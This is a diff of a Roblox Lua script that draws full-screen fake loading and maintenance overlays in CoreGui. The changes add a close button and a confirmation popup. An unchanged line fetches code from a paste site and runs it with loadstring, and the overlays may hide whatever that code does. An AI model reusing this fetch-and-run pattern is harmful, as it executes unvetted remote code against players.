@@ -3,13 +3,16 @@ loadstring(game:HttpGet("https://pastefy.app/Kt8s7Qj6/raw"))()
 
 local CoreGui = game:GetService("CoreGui")
 
+local loadingGui, maintenanceGui, confirmGui
+
 local function createLoadingScreen()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "TopLoadingGui"
-    gui.ResetOnSpawn = false
-    gui.IgnoreGuiInset = true
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-    gui.Parent = CoreGui
+    if loadingGui then loadingGui:Destroy() end
+    loadingGui = Instance.new("ScreenGui")
+    loadingGui.Name = "TopLoadingGui"
+    loadingGui.ResetOnSpawn = false
+    loadingGui.IgnoreGuiInset = true
+    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    loadingGui.Parent = CoreGui
 
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
@@ -18,7 +21,7 @@ local function createLoadingScreen()
     bg.BackgroundTransparency = 0.1
     bg.BorderSizePixel = 0
     bg.ZIndex = 9999
-    bg.Parent = gui
+    bg.Parent = loadingGui
 
     local barContainer = Instance.new("Frame")
     barContainer.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -120,11 +123,12 @@ local function createLoadingScreen()
         task.wait(0.1)
     end
 
-    gui:Destroy()
+    loadingGui:Destroy()
 end
 
 local function createMaintenanceScreen()
-    local maintenanceGui = Instance.new("ScreenGui")
+    if maintenanceGui then maintenanceGui:Destroy() end
+    maintenanceGui = Instance.new("ScreenGui")
     maintenanceGui.Name = "MaintenanceGui"
     maintenanceGui.ResetOnSpawn = false
     maintenanceGui.IgnoreGuiInset = true
@@ -166,10 +170,102 @@ local function createMaintenanceScreen()
     local uiCorner = Instance.new("UICorner", refreshButton)
     uiCorner.CornerRadius = UDim.new(0, 12)
 
+    local closeButton = Instance.new("TextButton")
+    closeButton.Size = UDim2.new(0.2, 0, 0.1, 0)
+    closeButton.Position = UDim2.new(0.4, 0, 0.78, 0)
+    closeButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+    closeButton.BorderSizePixel = 0
+    closeButton.Text = "X"
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.TextScaled = true
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.ZIndex = 9999
+    closeButton.Parent = maintenanceFrame
+
+    local uiCornerClose = Instance.new("UICorner", closeButton)
+    uiCornerClose.CornerRadius = UDim.new(0, 12)
+
     refreshButton.MouseButton1Click:Connect(function()
         maintenanceGui:Destroy()
         createLoadingScreen()
         createMaintenanceScreen()
+    end)
+
+    local function showConfirmPopup()
+        if confirmGui then confirmGui:Destroy() end
+        confirmGui = Instance.new("ScreenGui")
+        confirmGui.Name = "ConfirmGui"
+        confirmGui.ResetOnSpawn = false
+        confirmGui.IgnoreGuiInset = true
+        confirmGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+        confirmGui.Parent = CoreGui
+
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0.4, 0, 0.3, 0)
+        frame.Position = UDim2.new(0.3, 0, 0.35, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        frame.BorderSizePixel = 0
+        frame.ZIndex = 10000
+        frame.Parent = confirmGui
+
+        local uiCornerFrame = Instance.new("UICorner", frame)
+        uiCornerFrame.CornerRadius = UDim.new(0, 15)
+
+        local confirmText = Instance.new("TextLabel")
+        confirmText.Size = UDim2.new(1, 0, 0.5, 0)
+        confirmText.Position = UDim2.new(0, 0, 0, 0)
+        confirmText.BackgroundTransparency = 1
+        confirmText.Text = "Are you sure?"
+        confirmText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        confirmText.TextScaled = true
+        confirmText.Font = Enum.Font.GothamBold
+        confirmText.ZIndex = 10001
+        confirmText.Parent = frame
+
+        local yesButton = Instance.new("TextButton")
+        yesButton.Size = UDim2.new(0.4, 0, 0.3, 0)
+        yesButton.Position = UDim2.new(0.05, 0, 0.6, 0)
+        yesButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+        yesButton.BorderSizePixel = 0
+        yesButton.Text = "Yes"
+        yesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        yesButton.TextScaled = true
+        yesButton.Font = Enum.Font.GothamBold
+        yesButton.ZIndex = 10001
+        yesButton.Parent = frame
+
+        local noButton = Instance.new("TextButton")
+        noButton.Size = UDim2.new(0.4, 0, 0.3, 0)
+        noButton.Position = UDim2.new(0.55, 0, 0.6, 0)
+        noButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+        noButton.BorderSizePixel = 0
+        noButton.Text = "No"
+        noButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        noButton.TextScaled = true
+        noButton.Font = Enum.Font.GothamBold
+        noButton.ZIndex = 10001
+        noButton.Parent = frame
+
+        local uiCornerYes = Instance.new("UICorner", yesButton)
+        uiCornerYes.CornerRadius = UDim.new(0, 12)
+        local uiCornerNo = Instance.new("UICorner", noButton)
+        uiCornerNo.CornerRadius = UDim.new(0, 12)
+
+        yesButton.MouseButton1Click:Connect(function()
+            -- Terminate script: remove all GUIs and disconnect anything needed
+            if loadingGui then loadingGui:Destroy() end
+            if maintenanceGui then maintenanceGui:Destroy() end
+            if confirmGui then confirmGui:Destroy() end
+            -- You can add any additional cleanup here
+        end)
+
+        noButton.MouseButton1Click:Connect(function()
+            if confirmGui then confirmGui:Destroy() end
+        end)
+    end
+
+    closeButton.MouseButton1Click:Connect(function()
+        showConfirmPopup()
     end)
 end
 
